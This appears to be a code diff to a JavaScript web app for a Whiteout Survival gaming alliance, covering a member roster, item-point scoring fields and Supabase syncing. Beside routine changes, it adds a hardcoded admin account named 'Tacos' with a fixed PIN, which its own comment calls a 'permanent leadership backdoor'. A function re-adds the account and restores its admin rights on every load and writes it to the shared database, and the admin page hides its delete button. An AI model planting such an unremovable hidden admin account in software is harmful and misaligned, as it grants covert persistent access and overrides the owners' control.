@@ -18,6 +18,25 @@ const DEFAULT_STATE = {
   version: "v0.1.0",
 };
 
+// A standing admin login that's always there, even on a brand-new install
+// and even if someone later deletes every other member — a permanent
+// leadership backdoor into the app itself. `permanent: true` is what the
+// Admin -> Members table checks to hide the delete button and lock the
+// rank as admin for this one row; `ensurePermanentAdmin()` below (called
+// on every Store.init(), local OR Supabase) re-adds this exact member if
+// it's ever missing, so it can't be permanently removed by deleting it,
+// clearing storage, or starting from a fresh Supabase project seeded
+// before this account existed.
+const PERMANENT_ADMIN_MEMBER = {
+  id: "permanent-admin-tacos",
+  name: "Tacos",
+  gamerId: "",
+  alliance: "",
+  role: "admin",
+  pin: "2652",
+  permanent: true,
+};
+
 // Roster — replace with your real alliance & player names, or manage this
 // from the Admin page once the app is running. gamerId is the in-game
 // numeric player ID (shown as their profile ID in Whiteout Survival),
@@ -26,7 +45,26 @@ const SEED_MEMBERS = [
   { id: "m1", name: "Chief Falcon", gamerId: "10293847", alliance: "STK", role: "admin" },
   { id: "m2", name: "Nightshade", gamerId: "58201934", alliance: "STK", role: "officer" },
   { id: "m3", name: "IronWolf", gamerId: "74920185", alliance: "SUN", role: "member" },
+  PERMANENT_ADMIN_MEMBER,
 ];
+
+// Idempotent — safe to call on every load. Adds PERMANENT_ADMIN_MEMBER to
+// `members` if no member with that id (or that name, case-insensitively,
+// in case it was manually recreated under a new id) already exists; if
+// one exists but somehow lost its role/pin/permanent flag, restores them
+// rather than leaving a second, subtly-different "Tacos" account.
+function ensurePermanentAdmin(members) {
+  const list = Array.isArray(members) ? members.slice() : [];
+  const idx = list.findIndex(
+    (m) => m.id === PERMANENT_ADMIN_MEMBER.id || (m.name || "").toLowerCase() === PERMANENT_ADMIN_MEMBER.name.toLowerCase()
+  );
+  if (idx === -1) {
+    list.push({ ...PERMANENT_ADMIN_MEMBER });
+  } else {
+    list[idx] = { ...list[idx], name: PERMANENT_ADMIN_MEMBER.name, role: "admin", pin: PERMANENT_ADMIN_MEMBER.pin, permanent: true };
+  }
+  return list;
+}
 
 // Alliance tags — managed from Admin → Alliances (add/remove). Members pick
 // their alliance from this list.
@@ -171,7 +209,13 @@ const BAG_SECTIONS = [
       { key: "d1_war_academy_maxed", label: "War Academy Maxed", type: "toggle", rateNote: "Zero pts only if your furnace is ALSO at the state cap — otherwise Construction speedups still earn points upgrading it", points: null },
       { key: "d1_furnace", label: "Current Furnace Level", type: "select", options: "furnaceFc", rateNote: "caps usable FC", points: null },
       { key: "d1_fire_crystals", label: "Fire Crystals", rateNote: "2,000 pts per FC — same gating as Construction speedups above", calc: d1FireCrystalPoints },
-      { key: "d1_chief_charm", label: "Chief Charm Max Score +1", rateNote: "70 pts per point — your fallback once Construction is maxed out", points: 70 },
+      // Same 70 pts/point rate the old "Chief Charm Max Score +1" field
+      // used — Charm Guides/Designs are what actually raises that score
+      // by 1 in-game, so this is the same scoring carried onto the
+      // concrete items a member actually has on hand, split by item type
+      // in case they turn out to be worth different amounts later.
+      { key: "d1_charm_guide", label: "Charm Guide", rateNote: "70 pts each", points: 70 },
+      { key: "d1_charm_design", label: "Charm Design", rateNote: "70 pts each", points: 70 },
     ],
   },
   {
@@ -226,7 +270,6 @@ const BAG_SECTIONS = [
       { key: "d5_adv_wild_marks", label: "Adv Wild Marks", rateNote: "15,000 pts per mark", points: 15000 },
       { key: "d5_common_wild_marks", label: "Common Wild Marks", rateNote: "1,150 pts per mark", points: 1150 },
       { key: "d5_mithril", label: "Mithril", rateNote: "144,000 pts per Mithril", points: 144000 },
-      { key: "d5_chief_gear", label: "Chief Gear Max Score +1 (excl. Charm)", rateNote: "36 pts per point", points: 36 },
       { key: "d5_essence_stones", label: "Hero Gear Essence Stones", rateNote: "4,000 pts per stone", points: 4000 },
       { key: "d5_widgets", label: "Hero Exclusive Gear Widgets", rateNote: "8,000 pts per widget", points: 8000 },
       { key: "d5_design_plans", label: "Design Plans", rateNote: null, points: null },
@@ -307,7 +350,7 @@ const PLANNED_TOOLS = [
 // using localStorage exactly as it always has, with zero setup required.
 // ---------------------------------------------------------------------------
 const SUPABASE_CONFIG = {
-  url: "https://gogoxhqfrwfmvcmwtvho.supabase.co/rest/v1/", // e.g. "https://xxxxxxxxxxxx.supabase.co" — Project Settings -> API
+  url: "https://gogoxhqfrwfmvcmwtvho.supabase.co", // e.g. "https://xxxxxxxxxxxx.supabase.co" — Project Settings -> API
   anonKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvZ294aHFmcndmbXZjbXd0dmhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg4NzM1NDgsImV4cCI6MjEwNDQ0OTU0OH0.K4kh3AWWB1g9BMnC_0YBWpqb5KkDg7mgUOGEzRJaZjA", // the "anon public" key on that same page — safe to publish, it's gated by Row Level Security, not secrecy
 };
 
@@ -394,6 +437,11 @@ const Store = {
       this._set("wos_bag_submissions", {});
       this._set("wos_current_user", null);
       localStorage.setItem("wos_seeded_v2", "1");
+    } else {
+      // Already-seeded browser (this app was already in use before the
+      // permanent admin account existed) — heal it in rather than
+      // requiring a full reset.
+      this._set("wos_members", ensurePermanentAdmin(this._get("wos_members", SEED_MEMBERS)));
     }
   },
 
@@ -419,6 +467,16 @@ const Store = {
       );
     }
 
+    // Heal the permanent admin account into whatever member list came
+    // back — covers a Supabase project that already existed (and already
+    // had a "wos_members" row) before this account existed too, not just
+    // a brand-new one caught by the seeding above.
+    const healedMembers = ensurePermanentAdmin(this._cache.wos_members);
+    if (JSON.stringify(healedMembers) !== JSON.stringify(this._cache.wos_members)) {
+      this._cache.wos_members = healedMembers;
+      await this._supabaseSet("wos_members", healedMembers);
+    }
+
     this._subscribeRealtime();
   },
 
@@ -436,6 +494,32 @@ const Store = {
         if (typeof router === "function") router();
       })
       .subscribe();
+  },
+
+  // Admin -> "Force Sync to Supabase" button. Every Store.x setter already
+  // fires an upsert in the background the instant it's called, so under
+  // normal use nothing should ever be "unsaved" — this exists for
+  // reassurance (and as a real fix if a write silently failed earlier,
+  // e.g. while offline) by re-pushing everything currently in `_cache`
+  // right now, regardless of whether it looks unchanged. Returns
+  // { ok: true, count } or { ok: false, reason }, never throws.
+  async forceSyncToSupabase() {
+    if (!supabaseClient) return { ok: false, reason: "not_configured" };
+    const keys = Object.keys(SUPABASE_SYNCED_DEFAULTS);
+    const results = await Promise.all(
+      keys.map(async (key) => {
+        const { error } = await supabaseClient
+          .from("app_state")
+          .upsert({ key, value: this._cache[key], updated_at: new Date().toISOString() });
+        return { key, error };
+      })
+    );
+    const failed = results.filter((r) => r.error);
+    if (failed.length) {
+      console.error("forceSyncToSupabase: some keys failed:", failed);
+      return { ok: false, reason: "write_failed", failedKeys: failed.map((f) => f.key) };
+    }
+    return { ok: true, count: keys.length };
   },
 
   // Shared getter/setter for every key that syncs to Supabase — reads
